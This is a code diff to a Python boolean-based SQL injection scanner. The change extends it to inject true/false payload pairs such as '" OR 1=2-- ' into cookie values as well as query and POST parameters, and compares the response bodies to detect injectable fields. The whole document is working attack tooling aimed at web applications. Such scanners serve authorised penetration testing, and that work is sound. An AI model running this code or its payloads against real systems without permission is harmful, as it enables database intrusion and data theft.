@@ -15,40 +15,73 @@ PAYLOADS_FALSE = [
     '" OR 1=2-- '
 ]
 
-def fetch(url: str, method: str = "get", data: dict | None = None) -> str:
+def fetch(
+    url: str,
+    method: str = "get",
+    data: dict | None = None,
+    cookies: dict | None = None,
+) -> str:
     """Fetch a URL and return the body as text."""
-    return send_request(url, method=method, data=data)
+    return send_request(url, method=method, data=data, cookies=cookies)
 
 
 def test_parameter(
-    url: str, param: str, value: str, method: str = "get", data: dict | None = None
+    url: str,
+    param: str,
+    value: str,
+    method: str = "get",
+    data: dict | None = None,
+    cookies: dict | None = None,
+    location: str = "query",
 ):
     """Attempt boolean-based SQL injection on a parameter."""
     data = data or {}
+    cookies = cookies or {}
     parsed = urllib.parse.urlparse(url)
     query = urllib.parse.parse_qs(parsed.query)
-    if method.lower() == "get":
+    if location == "cookie":
+        original = cookies.get(param, "")
+        try:
+            baseline_body = fetch(url, method=method, data=data if method.lower() == "post" else None, cookies=cookies)
+        except Exception as e:
+            baseline_body = str(e)
+    elif method.lower() == "get":
         original = query.get(param, [''])[0]
         try:
-            baseline_body = fetch(url)
+            baseline_body = fetch(url, cookies=cookies)
         except Exception as e:
             baseline_body = str(e)
     else:
         original = data.get(param, "")
         try:
-            baseline_body = fetch(url, method="post", data=data)
+            baseline_body = fetch(url, method="post", data=data, cookies=cookies)
         except Exception as e:
             baseline_body = str(e)
     baseline_len = len(baseline_body)
 
     results = []
     for p_true, p_false in zip(PAYLOADS_TRUE, PAYLOADS_FALSE):
-        if method.lower() == "get":
+        if location == "cookie":
+            new_cookies = cookies.copy()
+            new_cookies[param] = original + p_true
+            true_url = url
+            try:
+                body_true = fetch(true_url, method=method, data=data if method.lower() == "post" else None, cookies=new_cookies)
+            except Exception as e:
+                body_true = str(e)
+
+            new_cookies[param] = original + p_false
+            false_url = url
+            try:
+                body_false = fetch(false_url, method=method, data=data if method.lower() == "post" else None, cookies=new_cookies)
+            except Exception as e:
+                body_false = str(e)
+        elif method.lower() == "get":
             query[param] = original + p_true
             new_query = urllib.parse.urlencode(query, doseq=True)
             true_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
             try:
-                body_true = fetch(true_url)
+                body_true = fetch(true_url, cookies=cookies)
             except Exception as e:
                 body_true = str(e)
 
@@ -56,7 +89,7 @@ def test_parameter(
             new_query = urllib.parse.urlencode(query, doseq=True)
             false_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
             try:
-                body_false = fetch(false_url)
+                body_false = fetch(false_url, cookies=cookies)
             except Exception as e:
                 body_false = str(e)
         else:
@@ -64,7 +97,7 @@ def test_parameter(
             post_true[param] = original + p_true
             true_url = url
             try:
-                body_true = fetch(true_url, method="post", data=post_true)
+                body_true = fetch(true_url, method="post", data=post_true, cookies=cookies)
             except Exception as e:
                 body_true = str(e)
 
@@ -72,7 +105,7 @@ def test_parameter(
             post_false[param] = original + p_false
             false_url = url
             try:
-                body_false = fetch(false_url, method="post", data=post_false)
+                body_false = fetch(false_url, method="post", data=post_false, cookies=cookies)
             except Exception as e:
                 body_false = str(e)
 
